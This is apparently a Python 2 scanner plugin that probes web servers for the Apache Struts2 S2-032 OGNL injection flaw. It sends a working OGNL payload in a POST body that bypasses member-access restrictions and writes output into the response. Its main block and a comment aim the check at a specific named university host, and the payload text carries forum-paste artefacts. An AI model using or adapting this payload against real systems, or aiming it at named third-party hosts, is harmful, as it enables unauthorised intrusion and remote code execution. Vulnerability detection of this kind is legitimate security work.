#!/usr/bin/env python
# encoding: utf-8

from ..t import T
import requests
from termcolor import cprint

class P(T):
    def __init__(self):
        T.__init__(self)
        keywords=['struts']

    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackresults=''):
        target_url = 'http://' + ip + ':' + port

        if productname.get('path', ''):
            target_url = 'http://' + ip + ':' + port + productname.get('path', '')
        else:
            from script import linktool
            listarray = linktool.getaction(target_url)
            if len(listarray) > 0:
                target_url = listarray[0]
            else:
                target_url = 'http://' + ip + ':' + port + '/login.action'
        result = {}
        timeout=3
        result['result']=False
        res=None
        # method:#_memberAccess%[email]3d@ognl.OgnlContext[/email]@DEFAULT_MEMBER_ACCESS,#w=#context.get(#parameters.rpsobj[0]),#w.getWriter().println(88888888-1),#w.getWriter().flush(),#w.getWriter().close(),1?#xx:#request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse" #method:#_memberAccess%[email]3d@ognl.OgnlContext[/email]@DEFAULT_MEMBER_ACCESS,#w=#context.get(#parameters.rpsobj[0]),#w.getWriter().println(88888888-1),#w.getWriter().flush(),#w.getWriter().close(),1?#xx:#request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse
        payload = "method:%23_memberAccess%[email]3d@ognl.OgnlContext[/email]@DEFAULT_MEMBER_ACCESS,%23w%3d%23context.get(%23parameters.rpsobj[0]),%23w.getWriter().println(88888888-1),%23w.getWriter().flush(),%23w.getWriter().close(),1?%23xx:%23request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse" #

        # http://gimssom.bnuz.edu.cn:8089/login.action
#        print target_url
        try:
            headers = {"Content-Type":"application/x-www-form-urlencoded"}
            r = requests.post(target_url,data=payload,headers=headers,timeout=5)
            res_html = r.text
        except Exception,e:
            print e
            return result
        finally:
            if res is not None:
                res.close()
                del res
        if res_html.find("88888887") <> -1:
	    cprint(target_url + '存在structs032漏洞', 'red')
            info = target_url + "struts032  Vul"
            result['result']=True
            result['VerifyInfo'] = {}
            result['VerifyInfo']['type']='struts032 Vul'
            result['VerifyInfo']['URL'] =target_url
            result['VerifyInfo']['payload']=payload
            result['VerifyInfo']['result'] =info
            result['VerifyInfo']['level'] = '高危(HOLE)'
            return result
        return result

if __name__ == '__main__':
    print P().verify(ip='gimssom.bnuz.edu.cn',port='8089')                
